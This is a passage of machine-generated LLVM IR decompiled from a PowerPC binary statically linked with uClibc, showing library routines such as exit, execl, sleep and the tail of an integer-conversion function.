dec_label_pc_100068a4:                            ; preds = %dec_label_pc_10006868, %dec_label_pc_10006804
  %v0_100068ac = phi i32 [ %v0_100068ac14, %dec_label_pc_10006804 ], [ %v0_100068ac12, %dec_label_pc_10006868 ]
  %v0_100068a4 = load i32, i32* %r25.global-to-local, align 4
  %v3_100068a4 = icmp eq i32 %v0_100068a4, 0
  br i1 %v3_100068a4, label %dec_label_pc_100068b0, label %dec_label_pc_100068ac

dec_label_pc_100068ac:                            ; preds = %dec_label_pc_100068a4
  %v2_100068ac = inttoptr i32 %v0_100068a4 to i32*
  store i32 %v0_100068ac, i32* %v2_100068ac, align 4
  br label %dec_label_pc_100068b0

dec_label_pc_100068b0:                            ; preds = %dec_label_pc_100068a4, %dec_label_pc_100068ac
  %v0_100068b0 = load i32, i32* %r26.global-to-local, align 4
  %v3_100068b0 = icmp eq i32 %v0_100068b0, 0
  %v0_100068b4 = load i32, i32* %r28.global-to-local, align 4
  %v1_100068b4 = sub i32 0, %v0_100068b4
  %tmp27 = lshr i32 %v1_100068b4, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_100068f4.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_100068b0, label %dec_label_pc_100068e4, label %dec_label_pc_100068cc

dec_label_pc_100068cc:                            ; preds = %dec_label_pc_100068b0
  %v3_100068cc = icmp ugt i32 %v0_100068f4.pre.pre, %tmp28
  br i1 %v3_100068cc, label %dec_label_pc_100068d4, label %dec_label_pc_100068e4

dec_label_pc_100068d4:                            ; preds = %dec_label_pc_100068cc
  %v0_100068d4 = call i32 @__errno_location()
  %v2_100068dc = inttoptr i32 %v0_100068d4 to i32*
  store i32 34, i32* %v2_100068dc, align 4
  %v0_100068e0 = load i32, i32* @r31, align 4
  store i32 %v0_100068e0, i32* %r8.global-to-local, align 4
  %v0_100068e4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100068e4

dec_label_pc_100068e4:                            ; preds = %dec_label_pc_100068b0, %dec_label_pc_100068cc, %dec_label_pc_100068d4
  %v0_100068f4.pre = phi i32 [ %v0_100068f4.pre.pre, %dec_label_pc_100068cc ], [ %v0_100068e0, %dec_label_pc_100068d4 ], [ %v0_100068f4.pre.pre, %dec_label_pc_100068b0 ]
  %v0_100068e4 = phi i32 [ %v0_100068b4, %dec_label_pc_100068cc ], [ %v0_100068e4.pre, %dec_label_pc_100068d4 ], [ %v0_100068b4, %dec_label_pc_100068b0 ]
  %v3_100068e4 = icmp eq i32 %v0_100068e4, 0
  br i1 %v3_100068e4, label %dec_label_pc_100068f0, label %dec_label_pc_100068ec

dec_label_pc_100068ec:                            ; preds = %dec_label_pc_100068e4
  %v1_100068ec = sub i32 0, %v0_100068f4.pre
  store i32 %v1_100068ec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100068f0

dec_label_pc_100068f0:                            ; preds = %dec_label_pc_100068e4, %dec_label_pc_100068ec
  %v0_100068f4 = phi i32 [ %v1_100068ec, %dec_label_pc_100068ec ], [ %v0_100068f4.pre, %dec_label_pc_100068e4 ]
  ret i32 %v0_100068f4

; uselistorder directives
  uselistorder i32 %v0_100068f4.pre, { 1, 0 }
  uselistorder i32 %v0_100068f4.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000689c, { 1, 0 }
  uselistorder i32 %v1_10006848, { 1, 0 }
  uselistorder i32 %v1_10006844, { 1, 0 }
  uselistorder i32 %v1_1000683c, { 1, 0 }
  uselistorder i32 %v3_10006830, { 1, 0 }
  uselistorder i32 %v0_10006898, { 1, 0, 2 }
  uselistorder i32 %v1_10006838, { 0, 2, 1 }
  uselistorder i32 %v0_1000682c, { 1, 0 }
  uselistorder i32 %v2_10006818, { 1, 0, 2 }
  uselistorder i32 %v1_100067f0, { 1, 0 }
  uselistorder i32 %v1_100067dc, { 1, 0, 2 }
  uselistorder i32 %v0_100067b8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32* %r28.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder label %dec_label_pc_100068f0, { 1, 0 }
  uselistorder label %dec_label_pc_100068e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100068b0, { 1, 0 }
  uselistorder label %dec_label_pc_10006868, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006830, { 1, 0 }
  uselistorder label %dec_label_pc_10006804, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100067f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100067bc, { 1, 0 }
  uselistorder label %dec_label_pc_100067b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006784, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10006920 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000692c = load i32, i32* @r3, align 4
  store i32 %v0_1000692c, i32* @r31, align 4
  store i32 %v2_10006920, i32* @r3, align 4
  %v0_10006938 = call i32 @__pthread_return_void()
  %v0_10006940 = call i32 @__pthread_return_0()
  %v3_10006948 = load i32, i32* @global_var_1001d860.412, align 4
  %v3_1000694c = icmp eq i32 %v3_10006948, 0
  br i1 %v3_1000694c, label %dec_label_pc_10006960, label %dec_label_pc_10006954

dec_label_pc_10006954:                            ; preds = %entry
  %v0_10006954 = load i32, i32* @r31, align 4
  %v3_1000695c = call i32 @unknown_0(i32 %v0_10006954, i32 268566528)
  br label %dec_label_pc_10006960

dec_label_pc_10006960:                            ; preds = %entry, %dec_label_pc_10006954
  store i32 %v2_10006920, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10006968 = call i32 @__pthread_return_void()
  store i32 %v0_10006968, i32* @r3, align 4
  store i32 268462448, i32* @lr, align 4
  %v1_1000696c = call i32 @__GI___uClibc_fini(i32 %v0_10006968)
  store i32 268462468, i32* @lr, align 4
  %v2_10006980 = call i32 @_stdio_term(i32 %v1_1000696c, i32 268449084)
  %v0_10006984 = load i32, i32* @r31, align 4
  %v1_10006988 = call i32 @__GI__exit(i32 %v0_10006984)
  ret i32 %v1_10006988

; uselistorder directives
  uselistorder label %dec_label_pc_10006960, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000698c = ptrtoint i32* %stack_var_0 to i32
  %v2_100069a8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100069a8, i32* %r0.global-to-local, align 4
  %v2_100069b0 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_100069a8, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100069dc

dec_label_pc_100069dc:                            ; preds = %dec_label_pc_10006a0c, %entry
  %v0_100069e0 = phi i32 [ 0, %entry ], [ %v1_100069e0, %dec_label_pc_10006a0c ]
  %stack_var_-52.0 = phi i32 [ %v2_100069b0, %entry ], [ %stack_var_-52.1, %dec_label_pc_10006a0c ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_10006a0c ]
  %v4_100069dc = zext i8 %stack_var_-56.0 to i32
  %v1_100069e0 = add i32 %v0_100069e0, 1
  %v1_100069e8 = mul nuw nsw i32 %v4_100069dc, 4
  store i32 %v1_100069e8, i32* %r0.global-to-local, align 4
  %v2_100069ec = add i32 %v1_100069e8, %v2_100069a8
  store i32 %v2_100069ec, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10006a00, label %dec_label_pc_100069f8

dec_label_pc_100069f8:                            ; preds = %dec_label_pc_100069dc
  %v1_100069f0 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10006a0c

dec_label_pc_10006a00:                            ; preds = %dec_label_pc_100069dc
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_10006a04 = add i32 %stack_var_-52.0, 4
  store i32 %v1_10006a04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10006a0c

dec_label_pc_10006a0c:                            ; preds = %dec_label_pc_100069f8, %dec_label_pc_10006a00
  %stack_var_-52.1 = phi i32 [ %v1_10006a04, %dec_label_pc_10006a00 ], [ %stack_var_-52.0, %dec_label_pc_100069f8 ]
  %v0_10006a0c = phi i32 [ %stack_var_-52.0, %dec_label_pc_10006a00 ], [ %v2_100069ec, %dec_label_pc_100069f8 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10006a00 ], [ %v1_100069f0, %dec_label_pc_100069f8 ]
  %v1_10006a0c = inttoptr i32 %v0_10006a0c to i32*
  %v2_10006a0c = load i32, i32* %v1_10006a0c, align 4
  store i32 %v2_10006a0c, i32* %r0.global-to-local, align 4
  %v3_10006a10 = icmp eq i32 %v2_10006a0c, 0
  br i1 %v3_10006a10, label %dec_label_pc_10006a18, label %dec_label_pc_100069dc

dec_label_pc_10006a18:                            ; preds = %dec_label_pc_10006a0c
  %v1_10006a18 = mul i32 %v1_100069e0, 4
  store i32 %v4_1000698c, i32* %r0.global-to-local, align 4
  %v1_10006a20 = add i32 %v1_10006a18, 34
  store i32 %v1_100069e0, i32* %ctr.global-to-local, align 4
  %v1_10006a28 = call i32 @__asm_rlwinm(i32 %v1_10006a20, i32 0, i32 0, i32 27)
  %v1_10006a30 = load i32, i32* @r1, align 4
  %v3_10006a30 = sub i32 %v1_10006a30, %v1_10006a28
  %v4_10006a30 = inttoptr i32 %v3_10006a30 to i32*
  store i32 %v4_1000698c, i32* %v4_10006a30, align 4
  %v1_10006a34 = add i32 %v3_10006a30, 23
  store i32 %v1_10006a34, i32* %r0.global-to-local, align 4
  %v1_10006a38 = call i32 @__asm_rlwinm(i32 %v1_10006a34, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10006a40 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006a40 = inttoptr i32 %v1_10006a38 to i32*
  store i32 %v0_10006a40, i32* %v2_10006a40, align 4
  store i32 %v1_10006a38, i32* %r11.global-to-local, align 4
  %v0_10006a48 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006a48 = trunc i32 %v0_10006a48 to i8
  store i32 %v2_100069a8, i32* %r0.global-to-local, align 4
  store i32 %v2_100069a8, i32* %stack_var_-48, align 4
  br label %dec_label_pc_10006a5c

dec_label_pc_10006a5c:                            ; preds = %dec_label_pc_10006a90.dec_label_pc_10006a5c_crit_edge, %dec_label_pc_10006a18
  %v0_10006a60 = phi i32 [ %v1_10006a38, %dec_label_pc_10006a18 ], [ %v0_10006a60.pre, %dec_label_pc_10006a90.dec_label_pc_10006a5c_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_100069b0, %dec_label_pc_10006a18 ], [ %stack_var_-52.3, %dec_label_pc_10006a90.dec_label_pc_10006a5c_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_10006a48, %dec_label_pc_10006a18 ], [ %stack_var_-56.3, %dec_label_pc_10006a90.dec_label_pc_10006a5c_crit_edge ]
  %v1_10006a60 = add i32 %v0_10006a60, 4
  store i32 %v1_10006a60, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_10006a84, label %dec_label_pc_10006a74

dec_label_pc_10006a74:                            ; preds = %dec_label_pc_10006a5c
  %v4_10006a5c = zext i8 %stack_var_-56.2 to i32
  %v1_10006a6c = add i8 %stack_var_-56.2, 1
  %v1_10006a68 = mul nuw nsw i32 %v4_10006a5c, 4
  %v3_10006a74 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10006a74, i32* %r0.global-to-local, align 4
  %v2_10006a7c = add i32 %v3_10006a74, %v1_10006a68
  br label %dec_label_pc_10006a90

dec_label_pc_10006a84:                            ; preds = %dec_label_pc_10006a5c
  %v1_10006a88 = add i32 %stack_var_-52.2, 4
  store i32 %v1_10006a88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10006a90

dec_label_pc_10006a90:                            ; preds = %dec_label_pc_10006a74, %dec_label_pc_10006a84
  %stack_var_-52.3 = phi i32 [ %v1_10006a88, %dec_label_pc_10006a84 ], [ %stack_var_-52.2, %dec_label_pc_10006a74 ]
  %v0_10006a90 = phi i32 [ %stack_var_-52.2, %dec_label_pc_10006a84 ], [ %v2_10006a7c, %dec_label_pc_10006a74 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_10006a84 ], [ %v1_10006a6c, %dec_label_pc_10006a74 ]
  %v1_10006a90 = inttoptr i32 %v0_10006a90 to i32*
  %v2_10006a90 = load i32, i32* %v1_10006a90, align 4
  store i32 %v2_10006a90, i32* %r0.global-to-local, align 4
  %v2_10006a94 = inttoptr i32 %v1_10006a60 to i32*
  store i32 %v2_10006a90, i32* %v2_10006a94, align 4
  %v0_10006a98 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006a98 = add i32 %v0_10006a98, -1
  store i32 %v1_10006a98, i32* %ctr.global-to-local, align 4
  %v2_10006a98 = icmp eq i32 %v1_10006a98, 0
  br i1 %v2_10006a98, label %dec_label_pc_10006a9c, label %dec_label_pc_10006a90.dec_label_pc_10006a5c_crit_edge

dec_label_pc_10006a90.dec_label_pc_10006a5c_crit_edge: ; preds = %dec_label_pc_10006a90
  %v0_10006a60.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006a5c

dec_label_pc_10006a9c:                            ; preds = %dec_label_pc_10006a90
  %v3_10006aa0 = load i32, i32* @global_var_1001d868.414, align 4
  store i32 268462760, i32* @lr, align 4
  %v2_10006aa4 = call i32 @__GI_execve(i32 %v3_10006aa0, i32 268566528)
  %v0_10006aa8 = load i32, i32* @r1, align 4
  %v1_10006aa8 = inttoptr i32 %v0_10006aa8 to i32*
  %v2_10006aa8 = load i32, i32* %v1_10006aa8, align 4
  store i32 %v2_10006aa8, i32* %r11.global-to-local, align 4
  %v1_10006aac = add i32 %v2_10006aa8, 4
  %v2_10006aac = inttoptr i32 %v1_10006aac to i32*
  %v3_10006aac = load i32, i32* %v2_10006aac, align 4
  store i32 %v3_10006aac, i32* %r0.global-to-local, align 4
  ret i32 %v2_10006aa4

; uselistorder directives
  uselistorder i32 %v1_10006a98, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_100069e8, { 1, 0 }
  uselistorder i32 %v1_100069e0, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_100069a8, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_10006a90, { 1, 0 }
  uselistorder label %dec_label_pc_10006a0c, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_10006ac0 = icmp eq i32 %arg1, 0
  br i1 %v3_10006ac0, label %dec_label_pc_10006c74, label %dec_label_pc_10006af0.lr.ph

dec_label_pc_10006af0.lr.ph:                      ; preds = %entry
  %v2_10006ae4 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_10006ae4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_10006af045 = add i32 %v2_10006ae4, 132
  %v3_10006af046 = inttoptr i32 %v2_10006af045 to i32*
  store i32 0, i32* %v3_10006af046, align 4
  %v0_10006af447 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006af448 = add i32 %v0_10006af447, -1
  store i32 %v1_10006af448, i32* %r11.global-to-local, align 4
  %v1_10006af849 = mul i32 %v1_10006af448, 4
  %v1_10006afc50 = load i32, i32* %r7.global-to-local, align 4
  %v2_10006afc51 = add i32 %v1_10006afc50, %v1_10006af849
  %v0_10006b0052 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006b0053 = add i32 %v0_10006b0052, -1
  store i32 %v1_10006b0053, i32* %ctr.global-to-local, align 4
  %v2_10006b0054 = icmp eq i32 %v1_10006b0053, 0
  br i1 %v2_10006b0054, label %dec_label_pc_10006b04, label %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge

dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge: ; preds = %dec_label_pc_10006af0.lr.ph, %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge
  %v2_10006afc55 = phi i32 [ %v2_10006afc, %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge ], [ %v2_10006afc51, %dec_label_pc_10006af0.lr.ph ]
  %v0_10006af0.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10006af0 = add i32 %v2_10006afc55, 8
  %v3_10006af0 = inttoptr i32 %v2_10006af0 to i32*
  store i32 %v0_10006af0.pre, i32* %v3_10006af0, align 4
  %v0_10006af4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006af4 = add i32 %v0_10006af4, -1
  store i32 %v1_10006af4, i32* %r11.global-to-local, align 4
  %v1_10006af8 = mul i32 %v1_10006af4, 4
  %v1_10006afc = load i32, i32* %r7.global-to-local, align 4
  %v2_10006afc = add i32 %v1_10006afc, %v1_10006af8
  %v0_10006b00 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006b00 = add i32 %v0_10006b00, -1
  store i32 %v1_10006b00, i32* %ctr.global-to-local, align 4
  %v2_10006b00 = icmp eq i32 %v1_10006b00, 0
  br i1 %v2_10006b00, label %dec_label_pc_10006b04, label %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge

dec_label_pc_10006b04:                            ; preds = %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge, %dec_label_pc_10006af0.lr.ph
  %v2_10006afc.lcssa = phi i32 [ %v2_10006afc51, %dec_label_pc_10006af0.lr.ph ], [ %v2_10006afc, %dec_label_pc_10006af0.dec_label_pc_10006af0_crit_edge ]
  %v0_10006b18.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_10006b04 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_10006b04, i32* %r29.global-to-local, align 4
  store i32 %v2_10006b04, i32* %r3.global-to-local, align 4
  store i32 %v0_10006b18.pre, i32* %stack_var_-440, align 4
  %v3_10006b1c = call i32 @__sigaddset(i32 %v2_10006b04, i32 17, i32 %v2_10006afc.lcssa)
  store i32 %v3_10006b1c, i32* %r3.global-to-local, align 4
  %v1_10006b20 = icmp slt i32 %v3_10006b1c, 0
  br i1 %v1_10006b20, label %dec_label_pc_10006c7c, label %dec_label_pc_10006b28

dec_label_pc_10006b28:                            ; preds = %dec_label_pc_10006b04
  %v2_10006b28 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_10006b28, i32* @r31, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268462908, i32* @lr, align 4
  %v3_10006b38 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_10006b04, i32 %v2_10006b28)
  store i32 %v3_10006b38, i32* %r3.global-to-local, align 4
  %v3_10006b3c = icmp eq i32 %v3_10006b38, 0
  br i1 %v3_10006b3c, label %dec_label_pc_10006b44, label %dec_label_pc_10006c7c

dec_label_pc_10006b44:                            ; preds = %dec_label_pc_10006b28
  store i32 %v2_10006b28, i32* %r3.global-to-local, align 4
  %v2_10006b4c = call i32 @__sigismember(i32 %v2_10006b28, i32 17)
  store i32 %v2_10006b4c, i32* %r3.global-to-local, align 4
  %v3_10006b50 = icmp eq i32 %v2_10006b4c, 0
  br i1 %v3_10006b50, label %dec_label_pc_10006b70.lr.ph, label %dec_label_pc_10006c3c

dec_label_pc_10006b70.lr.ph:                      ; preds = %dec_label_pc_10006b44
  store i32 %v2_10006ae4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_10006af046, align 4
  %v0_10006b7436 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006b7437 = add i32 %v0_10006b7436, -1
  store i32 %v1_10006b7437, i32* %r11.global-to-local, align 4
  %v1_10006b7838 = mul i32 %v1_10006b7437, 4
  %v1_10006b7c39 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006b7c40 = add i32 %v1_10006b7c39, %v1_10006b7838
  %v0_10006b8041 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006b8042 = add i32 %v0_10006b8041, -1
  store i32 %v1_10006b8042, i32* %ctr.global-to-local, align 4
  %v2_10006b8043 = icmp eq i32 %v1_10006b8042, 0
  br i1 %v2_10006b8043, label %dec_label_pc_10006b84, label %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge

dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge: ; preds = %dec_label_pc_10006b70.lr.ph, %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge
  %v2_10006b7c44 = phi i32 [ %v2_10006b7c, %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge ], [ %v2_10006b7c40, %dec_label_pc_10006b70.lr.ph ]
  %v0_10006b70.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_10006b70 = add i32 %v2_10006b7c44, 8
  %v3_10006b70 = inttoptr i32 %v2_10006b70 to i32*
  store i32 %v0_10006b70.pre, i32* %v3_10006b70, align 4
  %v0_10006b74 = load i32, i32* %r11.global-to-local, align 4
  %v1_10006b74 = add i32 %v0_10006b74, -1
  store i32 %v1_10006b74, i32* %r11.global-to-local, align 4
  %v1_10006b78 = mul i32 %v1_10006b74, 4
  %v1_10006b7c = load i32, i32* %r8.global-to-local, align 4
  %v2_10006b7c = add i32 %v1_10006b7c, %v1_10006b78
  %v0_10006b80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006b80 = add i32 %v0_10006b80, -1
  store i32 %v1_10006b80, i32* %ctr.global-to-local, align 4
  %v2_10006b80 = icmp eq i32 %v1_10006b80, 0
  br i1 %v2_10006b80, label %dec_label_pc_10006b84, label %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge

dec_label_pc_10006b84:                            ; preds = %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge, %dec_label_pc_10006b70.lr.ph
  %v2_10006b7c.lcssa = phi i32 [ %v2_10006b7c40, %dec_label_pc_10006b70.lr.ph ], [ %v2_10006b7c, %dec_label_pc_10006b70.dec_label_pc_10006b70_crit_edge ]
  store i32 %v2_10006b04, i32* %r3.global-to-local, align 4
  %v3_10006b8c = call i32 @__sigaddset(i32 %v2_10006b04, i32 17, i32 %v2_10006b7c.lcssa)
  store i32 %v3_10006b8c, i32* %r3.global-to-local, align 4
  %v1_10006b90 = icmp slt i32 %v3_10006b8c, 0
  br i1 %v1_10006b90, label %dec_label_pc_10006c7c, label %dec_label_pc_10006b98

dec_label_pc_10006b98:                            ; preds = %dec_label_pc_10006b84
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10006ba0 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268463016, i32* @lr, align 4
  %v4_10006ba4 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_10006ba0)
  store i32 %v4_10006ba4, i32* %r3.global-to-local, align 4
  %tmp33 = icmp sgt i32 %v4_10006ba4, -1
  br i1 %tmp33, label %dec_label_pc_10006bd8, label %dec_label_pc_10006bb0

dec_label_pc_10006bb0:                            ; preds = %dec_label_pc_10006b98
  %v0_10006bb0 = call i32 @__errno_location()
  store i32 %v0_10006bb0, i32* %r3.global-to-local, align 4
  %v1_10006bb8 = inttoptr i32 %v0_10006bb0 to i32*
  %v2_10006bb8 = load i32, i32* %v1_10006bb8, align 4
  store i32 %v0_10006bb0, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463052, i32* @lr, align 4
  %v3_10006bc8 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10006b28, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10006bd0 = inttoptr i32 %v0_10006bb0 to i32*
  store i32 %v2_10006bb8, i32* %v2_10006bd0, align 4
  %v0_10006c90.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c80

dec_label_pc_10006bd8:                            ; preds = %dec_label_pc_10006b98
  %v3_10006bd8 = load i32, i32* %stack_var_-176, align 4
  %v3_10006be4 = icmp eq i32 %v3_10006bd8, 1
  br i1 %v3_10006be4, label %dec_label_pc_10006bec, label %dec_label_pc_10006c20

dec_label_pc_10006bec:                            ; preds = %dec_label_pc_10006bd8
  store i32 %v2_10006ae4, i32* %r3.global-to-local, align 4
  store i32 268463096, i32* @lr, align 4
  %v2_10006bf4 = call i32 @__libc_nanosleep(i32 %v2_10006ae4, i32 %v2_10006ae4)
  store i32 %v2_10006bf4, i32* %r3.global-to-local, align 4
  store i32 %v2_10006bf4, i32* @r31, align 4
  %v0_10006bfc = call i32 @__errno_location()
  store i32 %v0_10006bfc, i32* %r3.global-to-local, align 4
  store i32 %v0_10006bfc, i32* %r29.global-to-local, align 4
  %v1_10006c0c = inttoptr i32 %v0_10006bfc to i32*
  %v2_10006c0c = load i32, i32* %v1_10006c0c, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463128, i32* @lr, align 4
  %v3_10006c14 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10006b28, i32 0)
  store i32 %v3_10006c14, i32* %r3.global-to-local, align 4
  %v1_10006c18 = load i32, i32* %r29.global-to-local, align 4
  %v2_10006c18 = inttoptr i32 %v1_10006c18 to i32*
  store i32 %v2_10006c0c, i32* %v2_10006c18, align 4
  %v0_10006c48.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006c48

dec_label_pc_10006c20:                            ; preds = %dec_label_pc_10006bd8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463152, i32* @lr, align 4
  %v3_10006c2c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10006b28, i32 0)
  br label %dec_label_pc_10006c3c

dec_label_pc_10006c3c:                            ; preds = %dec_label_pc_10006b44, %dec_label_pc_10006c20
  store i32 %v2_10006ae4, i32* %r3.global-to-local, align 4
  store i32 268463172, i32* @lr, align 4
  %v2_10006c40 = call i32 @__libc_nanosleep(i32 %v2_10006ae4, i32 %v2_10006ae4)
  store i32 %v2_10006c40, i32* %r3.global-to-local, align 4
  store i32 %v2_10006c40, i32* @r31, align 4
  br label %dec_label_pc_10006c48

dec_label_pc_10006c48:                            ; preds = %dec_label_pc_10006bec, %dec_label_pc_10006c3c
  %v0_10006c48 = phi i32 [ %v0_10006c48.pr, %dec_label_pc_10006bec ], [ %v2_10006c40, %dec_label_pc_10006c3c ]
  %v3_10006c48 = icmp eq i32 %v0_10006c48, 0
  br i1 %v3_10006c48, label %dec_label_pc_10006c74, label %dec_label_pc_10006c50

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006c48
  %v3_10006c60 = load i32, i32* %stack_var_-440, align 4
  %v0_10006c64 = call i32 @__asm_mfcr()
  store i32 %v0_10006c64, i32* %r3.global-to-local, align 4
  %v1_10006c68 = call i32 @__asm_rlwinm(i32 %v0_10006c64, i32 30, i32 31, i32 31)
  %v2_10006c6c = add i32 %v3_10006c60, %v1_10006c68
  store i32 %v2_10006c6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c80

dec_label_pc_10006c74:                            ; preds = %dec_label_pc_10006c48, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c80

dec_label_pc_10006c7c:                            ; preds = %dec_label_pc_10006b28, %dec_label_pc_10006b84, %dec_label_pc_10006b04
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c80

dec_label_pc_10006c80:                            ; preds = %dec_label_pc_10006c74, %dec_label_pc_10006c50, %dec_label_pc_10006bb0, %dec_label_pc_10006c7c
  %v0_10006c90 = phi i32 [ 0, %dec_label_pc_10006c74 ], [ %v2_10006c6c, %dec_label_pc_10006c50 ], [ %v0_10006c90.pre, %dec_label_pc_10006bb0 ], [ -1, %dec_label_pc_10006c7c ]
  ret i32 %v0_10006c90

; uselistorder directives
  uselistorder i32 %v1_10006b80, { 1, 0 }
